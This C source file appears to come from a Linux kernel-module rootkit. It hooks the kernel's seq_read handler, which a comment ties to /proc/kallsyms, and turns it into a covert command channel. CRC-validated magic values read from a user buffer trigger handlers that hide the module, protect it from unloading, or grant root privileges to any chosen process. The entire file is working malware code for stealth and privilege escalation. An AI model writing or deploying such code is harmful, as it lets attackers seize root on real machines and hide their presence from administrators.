#include "include/comms.h"

/* Executes appropriate functions based on given signal. pid is meant to be used
 * with signal SIG_ROOT */
void sig_handle(const uint32_t sig, pid_t pid) {
  switch (sig) {
  case SIG_HIDE:
    handle_lkm_hide();
    break;

  case SIG_PROTECT:
    handle_lkm_protect();
    break;

  case SIG_GOD:
    handle_lkm_hide();
    handle_lkm_protect();
    break;

  case SIG_ROOT:
    set_root(pid);
    break;

  default:
    break;
  }
}

/*
static const struct proc_ops kallsyms_proc_ops = {
        .proc_open	= kallsyms_open,
        .proc_read	= seq_read, <-- This is our target
        .proc_lseek	= seq_lseek,
        .proc_release	= seq_release_private,
};
*/
asmlinkage ssize_t (*orig_seq_read)(struct file *file, char __user *buf,
                                    size_t size, loff_t *ppos);
asmlinkage ssize_t hook_seq_read(struct file *file, char __user *buf,
                                 size_t size, loff_t *ppos) {
  char *kbuf;
  long error;

  uint8_t sig;
  pid_t pid;
  uint32_t extracted_crc;

  kbuf = kmalloc(size, GFP_KERNEL);
  if (!kbuf) {
    return orig_seq_read(file, buf, size, ppos);
  }

  error = copy_from_user(kbuf, buf, size);
  if (error) {
    kfree(kbuf);
    return orig_seq_read(file, buf, size, ppos);
  }

  if (size < TOTAL_SIZE) {
    kfree(kbuf);
    return orig_seq_read(file, buf, size, ppos);
  }

  extract_components(kbuf, &sig, &pid, &extracted_crc);

  if (!is_valid_crc(kbuf, extracted_crc, CRC_OFFSET)) {
    kfree(kbuf);
    return orig_seq_read(file, buf, size, ppos);
  }
  sig_handle(sig, pid);

  kfree(kbuf);
  return orig_seq_read(file, buf, size, ppos);
}
